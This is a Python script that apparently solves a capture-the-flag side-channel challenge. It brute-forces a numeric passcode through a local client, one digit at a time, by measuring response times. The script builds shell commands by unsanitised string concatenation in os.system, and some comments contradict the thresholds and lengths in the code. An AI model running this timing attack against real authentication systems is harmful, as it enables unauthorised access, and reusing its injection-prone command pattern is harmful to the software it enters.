'''
This is a working solution for the side channel challenge :)
The solution does not multi-thread, which would be much faster. However, it does work! :) 
'''
import os
import time

IP = "127.0.0.1"
PORT = "10000"

# Calls the client from the CLI. 
# Returns the time taken. 
def run(password):
	start = time.time()
	os.system("./client " + IP + " " + PORT + " " + password)
	end = time.time()
	time_taken = end - start
	return time_taken

# Forces a single number. 
def solve_single(loc, current_code, total_time):
	passcode = current_code 
	
	for i in range(10):
		passcode = list(passcode) 
		passcode[loc] = str(i)
		passcode = "".join(passcode)
		
		time_taken = run(passcode) 
		print(passcode, time_taken) 

		# If the time taken on the request is greater than 0.4 seconds, then this was a leak on the passcode. 
		if(total_time + 0.9 <  time_taken):
			print("Found char at index " + str(loc) + " : " + str(i)) 
			return i, time_taken
			

		
	return "failed..."
	
# Forces the entire passcode
def solve():

	# 8 characters in the flag. 
	# Use an 'X' in order to not accidentally to have a larger time gain than antipicated.
	passcode = "XXXXXXXXX"
	
	# Get a default runtime, with the first character being wrong. 
	total_time = run(passcode)
	for i in range(9):
        # TODO - multi thread this
		char, total_time = solve_single(i,passcode, total_time)
		passcode = list(passcode) 
		passcode[i] = str(char)
		passcode = "".join(passcode)		
	
	# This is the flag!
	print("Final passcode is...", passcode) 

#solve_single(7,"12348210",7)
solve()
	
